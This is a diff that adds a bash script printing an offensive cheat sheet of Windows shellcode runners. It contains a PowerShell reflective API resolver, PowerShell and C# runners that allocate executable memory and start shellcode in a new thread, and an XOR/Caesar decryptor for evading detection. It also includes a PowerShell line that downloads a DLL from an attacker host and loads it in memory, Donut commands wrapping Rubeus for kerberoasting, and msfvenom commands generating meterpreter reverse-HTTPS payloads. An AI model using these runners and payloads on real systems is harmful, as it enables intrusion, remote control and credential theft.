@@ -1,0 +1,71 @@
+#!/bin/bash
+BOLD='\033[1m'
+CYAN='\033[36m'
+GREEN='\033[32m'
+YELLOW='\033[33m'
+BLUE='\033[34m'
+NC='\033[0m'
+
+printf "\n"
+echo -e "${BOLD}${YELLOW}── SHELLCODE RUNNERS ────────────────────────────────${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── PowerShell LookupFunc Reflective Runner ──────────${NC}"
+echo -e "  Note: Resolves Win32 APIs without DllImport"
+echo -e "  ${GREEN}function LookupFunc { \$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { \$_.GlobalAssemblyCache -And \$_.Location.Split('\\\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods'); \$tmp=@(); \$assem.GetMethods() | ForEach-Object {If(\$_.Name -eq 'GetProcAddress') {\$tmp+=\$_}}; return \$tmp[0].Invoke(\$null, @((\$assem.GetMethod('GetModuleHandle')).Invoke(\$null, @(\$args[0])), \$args[1])) }${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── PS Add-Type Classic Runner ───────────────────────${NC}"
+echo -e "  ${GREEN}\$code = @\"${NC}"
+echo -e "  ${GREEN}[DllImport(\"kernel32.dll\")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);${NC}"
+echo -e "  ${GREEN}[DllImport(\"kernel32.dll\")] public static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr f, IntPtr p, uint c, IntPtr i);${NC}"
+echo -e "  ${GREEN}[DllImport(\"kernel32.dll\")] public static extern UInt32 WaitForSingleObject(IntPtr h, UInt32 ms);${NC}"
+echo -e "  ${GREEN}\"@${NC}"
+echo -e "  ${GREEN}\$types = Add-Type -MemberDefinition \$code -Name 'Win32' -Namespace Win32Functions -PassThru${NC}"
+echo -e "  ${GREEN}[Byte[]]\$buf = <shellcode_ps1_format>${NC}"
+echo -e "  ${GREEN}\$addr = \$types[0]::VirtualAlloc(0, \$buf.Length, 0x3000, 0x40)${NC}"
+echo -e "  ${GREEN}[System.Runtime.InteropServices.Marshal]::Copy(\$buf, 0, \$addr, \$buf.Length)${NC}"
+echo -e "  ${GREEN}\$h = \$types[0]::CreateThread(0,0,\$addr,0,0,0); \$types[0]::WaitForSingleObject(\$h, [uint32]'0xFFFFFFFF')${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── C# P/Invoke Runner ───────────────────────────────${NC}"
+echo -e "  ${GREEN}[DllImport(\"kernel32.dll\")] static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);${NC}"
+echo -e "  ${GREEN}[DllImport(\"kernel32.dll\")] static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr f, IntPtr p, uint c, IntPtr i);${NC}"
+echo -e "  ${GREEN}[DllImport(\"kernel32.dll\")] static extern UInt32 WaitForSingleObject(IntPtr h, UInt32 ms);${NC}"
+echo -e "  ${GREEN}byte[] buf = new byte[] { <csharp_shellcode> };${NC}"
+echo -e "  ${GREEN}IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);${NC}"
+echo -e "  ${GREEN}Marshal.Copy(buf, 0, addr, buf.Length);${NC}"
+echo -e "  ${GREEN}IntPtr t = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);${NC}"
+echo -e "  ${GREEN}WaitForSingleObject(t, 0xFFFFFFFF);${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── C# XOR + Caesar Decrypt at Runtime ───────────────${NC}"
+echo -e "  ${GREEN}for (int i = 0; i < enc.Length; i++) {${NC}"
+echo -e "  ${GREEN}    enc[i] = (byte)(enc[i] - caesarShift);${NC}  // undo Caesar"
+echo -e "  ${GREEN}    enc[i] = (byte)(enc[i] ^ xorKey);${NC}        // then XOR"
+echo -e "  ${GREEN}}${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── PS Assembly::Load (Disk-Free DLL) ────────────────${NC}"
+echo -e "  ${GREEN}\$data = (New-Object System.Net.WebClient).DownloadData('http://<ATTACKER_IP>/runner.dll')${NC}"
+echo -e "  ${GREEN}\$assem = [System.Reflection.Assembly]::Load(\$data)${NC}"
+echo -e "  ${GREEN}\$class = \$assem.GetType('Namespace.ClassName')${NC}"
+echo -e "  ${GREEN}\$method = \$class.GetMethod('Run')${NC}"
+echo -e "  ${GREEN}\$method.Invoke(0, \$null)${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Donut (Shellcode from PE/DLL/.NET) ───────────────${NC}"
+echo -e "  ${GREEN}donut -f 1 -a 2 -o shellcode.bin -i Rubeus.exe -c Rubeus.Program -m Main -p 'kerberoast /outfile:hashes.txt'${NC}"
+echo -e "  ${GREEN}donut -f 1 -a 2 -o shellcode.bin -i tool.exe${NC}"
+echo -e "  Note: -f 1 = raw bin, -a 2 = x64, -c = class, -m = method, -p = params"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Generate Shellcode ───────────────────────────────${NC}"
+echo -e "  ${GREEN}msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP> LPORT=443 -f ps1${NC}"
+echo -e "  ${GREEN}msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP> LPORT=443 -f csharp${NC}"
+echo -e "  ${GREEN}msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP> LPORT=443 -f raw -o sc.bin${NC}"
+echo -e "  ${GREEN}msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP> LPORT=443 -f rust${NC}"
+printf "\n"
+
+printf "\n"
+echo -e "${YELLOW}─────────────────────────────────────────────────────${NC}"
